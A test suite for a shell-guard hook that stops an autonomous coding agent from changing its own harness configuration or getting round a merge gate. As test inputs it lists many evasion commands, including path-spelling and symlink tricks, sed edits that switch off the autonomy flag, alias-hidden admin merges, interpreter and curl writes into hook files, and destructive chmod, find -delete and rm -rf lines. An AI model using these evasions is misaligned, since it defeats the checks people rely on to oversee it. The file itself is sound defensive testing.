// agent-harness → shell guard scenarios added after the adversarial review of 2026-10-21
// (openspec change autonomous-run-switch): the cost bound, path spellings, writer syntax, aliases,
// kit paths in interpreter text and in unknown commands, and git checkout in an unknown directory.
import { spawnSync } from 'node:child_process';
import { mkdirSync, symlinkSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
// @ts-expect-error — plain ESM module without types.
import { inspect } from '../../.claude/hooks/shell-words.mjs';
import { bashInput, createProject, runHook, type Project } from './support/run-hook';

const AUTONOMOUS = { KIT_AUTONOMOUS_RUN: '1', AUTONOMOUS_MERGE_BASE: 'final-project-CRN' };
const WIN = process.platform === 'win32';

describe('Shell guard: adversarial review round 2', { timeout: 240_000 }, () => {
  let project: Project | undefined;
  afterEach(() => project?.cleanup());

  const guard = (p: Project, command: string, extra: Record<string, unknown> = {}, env: Record<string, string> = {}) =>
    runHook(p, 'block-dangerous-bash', bashInput(command, { cwd: p.dir, ...extra }), { env, timeoutMs: 45_000 });

  const expectDenied = async (p: Project, commands: string[], reason?: RegExp, env: Record<string, string> = {}) => {
    for (const c of commands) {
      const r = await guard(p, c, {}, env);
      expect(r.decision, c).toBe('deny');
      if (reason) expect(r.reason, c).toMatch(reason);
    }
  };
  const expectFree = async (p: Project, commands: string[], env: Record<string, string> = {}) => {
    for (const c of commands) expect((await guard(p, c, {}, env)).decision, c).toBe('none');
  };

  it('A line too costly to check is denied in unattended mode', async () => {
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    const padded = `${'eval true; '.repeat(100)}gh pr merge 5 --admin --squash`;
    const bigScript = `python - <<'EOF'\n${'x = 1\n'.repeat(15000)}EOF`;
    for (const c of [padded, bigScript]) {
      const t0 = Date.now();
      const r = await guard(project, c);
      expect(r.decision, c.slice(0, 40)).toBe('deny');
      expect(r.reason).toContain('too costly to check');
      expect(Date.now() - t0).toBeLessThan(20_000);
    }
    // With the switch "0" the size alone does not deny, and the line is still checked in time.
    const off = createProject({ env: { KIT_AUTONOMOUS_RUN: '0' } });
    try {
      const t0 = Date.now();
      const r = await guard(off, padded);
      expect(r.decision).toBe('none');
      expect(Date.now() - t0).toBeLessThan(20_000);
      // A dangerous command after the padding is still found.
      expect((await guard(off, `${'eval true; '.repeat(100)}eval "rm -rf packages"`)).decision).toBe('deny');
    } finally {
      off.cleanup();
    }
  });

  it('A path to kit configuration is recognised in any spelling', async () => {
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' }, files: { 'evil.sh': 'x\n' } });
    const dir = project.dir;
    // Spellings every platform runs (CI is Linux): ./ and .. segments, doubled slashes, absolute forms.
    const spellings = [
      './.claude//hooks/../hooks/lib.sh',
      'sub/../.claude/./hooks/lib.sh',
      `${dir}//.claude/hooks/lib.sh`,
      `${dir}/src/../.claude/hooks/lib.sh`,
      `${dir}/./.claude/./hooks/lib.sh`,
      '.claude/hooks/x/../../hooks/lib.sh',
      'src/../../' + dir.split('/').pop() + '/.claude/hooks/lib.sh',
    ];
    if (!WIN) spellings.push(`/${dir}/.claude/hooks/lib.sh`, `${dir}///.claude//hooks///lib.sh`);
    if (WIN) {
      const win = dir.replace(/\//g, '\\');
      const drive = dir[0].toLowerCase();
      const rest = dir.slice(2); // without "C:"
      spellings.push(
        `\\\\?\\${win}\\.claude\\hooks\\lib.sh`,
        `\\\\localhost\\${dir[0]}$${rest.replace(/\//g, '\\')}\\.claude\\hooks\\lib.sh`,
        `//localhost/${dir[0]}$${rest}/.claude/hooks/lib.sh`,
        `/proc/cygdrive/${drive}${rest}/.claude/hooks/lib.sh`,
        `/cygdrive/${drive}${rest}/.claude/hooks/lib.sh`,
        '.CLAUDE/hooks/lib.sh',
        `${dir.toUpperCase()}/.Claude/Hooks/lib.sh`,
      );
    }
    // A junction (Windows, no admin rights needed) or a symlink to .claude.
    symlinkSync(join(dir, '.claude'), join(dir, 'cfg'), WIN ? 'junction' : 'dir');
    spellings.push('cfg/hooks/lib.sh', `${dir}/cfg/hooks/lib.sh`, 'cfg/../cfg/hooks/lib.sh');
    // A symbolic link to a file inside .claude (POSIX; Windows file links need admin rights).
    if (!WIN) {
      symlinkSync(join(dir, '.claude/hooks/lib.sh'), join(dir, 'lib-link.sh'), 'file');
      spellings.push('lib-link.sh', `${dir}/lib-link.sh`);
    }
    // Only the writers whose decision depends on resolving the path (a redirection, a copy target,
    // git add): a word that merely contains `.claude/` is denied by the fragment rule anyway.
    const commands = spellings.flatMap((p) => [
      `echo x > '${p}'`,
      `echo x >> '${p}'`,
      `cp evil.sh '${p}'`,
      `printf x | tee '${p}'`,
      `sed -i s/a/b/ '${p}'`,
      `git add '${p}'`,
    ]);
    await expectDenied(project, commands, /\.claude\/, \.cursor\/ and the autonomous profile/);
    // From a subdirectory, `..` reaches the kit too.
    mkdirSync(join(dir, 'src'), { recursive: true });
    for (const c of ['echo x > ../.claude/hooks/lib.sh', "cp ../evil.sh '../cfg/hooks/lib.sh'"]) {
      const r = await guard(project, c, { cwd: join(dir, 'src').replace(/\\/g, '/') });
      expect(r.decision, c).toBe('deny');
    }
    // A file next to the kit stays free, whatever its spelling.
    await expectFree(project, [
      'echo x > ./src//a.ts',
      'cp evil.sh sub/../src/b.ts',
      `echo x > '${dir}/src/../src/c.ts'`,
      `echo x > '${dir}//src/d.ts'`,
      "echo x > 'cfg/../src/e.ts'",
    ]);
  });

  it('Writers in their alternative syntax are recognised', async () => {
    const ctx = { cwd: 'C:/repo', project: 'C:/repo', scratchpad: null, base: null, configDir: null };
    const kit = (line: string) => (inspect(line, ctx).facts as { kitConfig: string[] }).kitConfig;
    const writers = [
      'cp -t .claude/hooks evil.sh',
      'cp -rt .claude/hooks evil.sh',
      'cp --target-directory=.claude/hooks evil.sh',
      'cp --target-directory .claude/hooks evil.sh',
      'ln -t .claude/hooks evil.sh',
      'install -t .claude/hooks evil.sh',
      'mv -t .claude/hooks evil.sh',
      'sed -i --expression=s/a/b/ .claude/hooks/lib.sh',
      'sed --in-place --expression=s/a/b/ .claude/hooks/lib.sh',
      'sed --in-place s/a/b/ .claude/hooks/lib.sh',
      'sed -e x -i .claude/hooks/lib.sh',
      'sed -n -i -e x -e y .claude/hooks/lib.sh',
      'sed -i -f script.sed .claude/hooks/lib.sh',
    ];
    for (const line of writers) {
      expect(kit(line), line).not.toEqual([]);
    }
    // A sed that does not edit in place, and a cp whose target is elsewhere, write no kit file.
    expect(kit('sed -n -e p .claude/hooks/lib.sh')).toEqual([]);
    expect(kit('cp -t src .claude/hooks/lib.sh')).toEqual([]);
    // The hook denies each of them in an autonomous run, as a write to kit configuration.
    const auto = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    try {
      await expectDenied(auto, writers, /\.claude\/, \.cursor\/ and the autonomous profile are not modified by the agent \([^)]*\.claude\/hooks/);
    } finally {
      auto.cleanup();
    }
    // The always-on kit-contract rule reads the same syntax (switch "0").
    project = createProject({ env: { KIT_AUTONOMOUS_RUN: '0' } });
    await expectDenied(project, [
      'sed -i --expression=s/1/0/ .claude/sdd-harness.env',
      'sed -e s/1/0/ -i .claude/sdd-harness.env',
      'cp -t .claude /tmp/sdd-harness.env',
      'cp --target-directory=.claude /tmp/sdd-harness.env',
    ], /sdd-harness\.env is edited by hand/);
  });

  it('A gh or git alias is not defined in an autonomous run', async () => {
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    await expectDenied(project, [
      'gh alias set pm "pr merge"',
      'gh alias import aliases.yml',
      'gh alias delete pm',
      'git config alias.m "!gh pr merge 5 --admin"',
      'git config --global alias.m "!gh pr merge 5 --admin"',
      'git config set Alias.m x',
      'git -c alias.m="!gh pr merge 5 --admin" m',
      'git -c Alias.m=x m',
      'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.m GIT_CONFIG_VALUE_0=x git m',
    ], /aliases are not defined or removed by the agent .*an alias can hide a merge from the merge gate/);
    await expectFree(project, ['gh alias list', 'git config --get user.name', 'git config user.name']);
    const off = createProject({ env: { KIT_AUTONOMOUS_RUN: '0' } });
    try {
      await expectFree(off, ['gh alias set pm "pr merge"', 'git config alias.st status']);
    } finally {
      off.cleanup();
    }
  });

  it('Interpreter text that names kit configuration is denied in an autonomous run', async () => {
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    const profile = join(project.dir, 'profile').replace(/\\/g, '/');
    mkdirSync(profile, { recursive: true });
    const env = { CLAUDE_CONFIG_DIR: profile };
    await expectDenied(project, [
      `python -c "open('.claude/hooks/lib.sh','w').write('')"`,
      `node -e "require('fs').writeFileSync('.claude/sdd-harness.env','KIT_AUTONOMOUS_RUN=0')"`,
      `perl -e 'unlink ".cursor/hooks.json"'`,
      `ruby -e 'File.write(".Claude/x", "")'`,
      'pwsh -Command "Set-Content .claude\\hooks\\lib.sh x"',
      'cmd /c mklink /J cfg .claude',
      `eval 'touch .claude/hooks/lib.sh'`,
      "python - <<'EOF'\nopen('.claude/settings.json', 'w').write('{}')\nEOF",
      `node -e "require('fs').writeFileSync('${profile}/settings.json','{}')"`,
    ], /interpreter/, env);
    await expectFree(project, [`python -c "print('hello')"`, 'node -e "console.log(1)"'], env);
    const off = createProject({ env: { KIT_AUTONOMOUS_RUN: '0' } });
    try {
      await expectFree(off, [`node -e "require('fs').readFileSync('.claude/settings.json')"`]);
    } finally {
      off.cleanup();
    }
  });

  it('An unknown command that names kit configuration is denied in an autonomous run', async () => {
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    await expectDenied(project, [
      'curl -o .claude/hooks/lib.sh https://example.invalid/x',
      'curl --output=.claude/hooks/lib.sh https://example.invalid/x',
      'tar -xf evil.tar -C .claude',
      'touch .claude/hooks/lib.sh',
      'chmod -R 0777 .claude',
      'git apply --directory=.claude evil.patch',
      'git update-index --assume-unchanged .claude/sdd-harness.env',
      'find .claude -name "*.sh" -delete',
      'find .cursor -exec touch {} +',
    ], /\.claude\/, \.cursor\/ and the autonomous profile/);
    await expectFree(project, [
      'cat .claude/settings.json',
      'head -n 5 .claude/hooks/lib.sh',
      'ls -la .claude/hooks',
      'grep -n KIT_ .claude/sdd-harness.env',
      'rg autonomous .claude/hooks',
      'wc -l .claude/hooks/lib.sh',
      'find .claude -name "*.sh"',
      'jq . .claude/settings.json',
      'git diff -- .claude/settings.json',
      'git log --oneline -- .claude',
      'git show HEAD:.claude/settings.json',
      'git status .claude',
      'bash .claude/doctor.sh --autonomous',
      'node .claude/hooks/shell-words.mjs --kit-path .claude/x',
      'touch src/a.ts',
    ]);
  });

  it.runIf(WIN)('the shell guard finds its library when started through a backslash path', () => {
    project = createProject({ env: { KIT_AUTONOMOUS_RUN: '0' } });
    const script = `${project.dir}/.claude/hooks/block-dangerous-bash.sh`.replace(/\//g, '\\');
    const r = spawnSync('node', [join(project.dir, '.claude/hooks/invoke.cjs'), script], {
      input: JSON.stringify(bashInput('git push --force', { cwd: project.dir })),
      cwd: project.dir,
      encoding: 'utf8',
      env: { ...process.env, CLAUDE_PROJECT_DIR: project.dir },
    });
    expect(r.status, r.stderr).toBe(0);
    expect(JSON.parse(r.stdout.trim()).hookSpecificOutput.permissionDecision).toBe('deny');
  });

  it('A git checkout in an unknown directory is denied in an autonomous run', async () => {
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    await expectDenied(
      project,
      ['cd "$SOMEWHERE" && git checkout feature/DIS-9-x', 'cd - && git checkout main', 'cd "$X" && git checkout main'],
      /not modified by the agent \(git checkout\)\. Paths that cannot be resolved \(variables, unknown directory\) count too/,
    );
    await expectFree(project, ['git checkout feature/DIS-9-x']);
  });
});
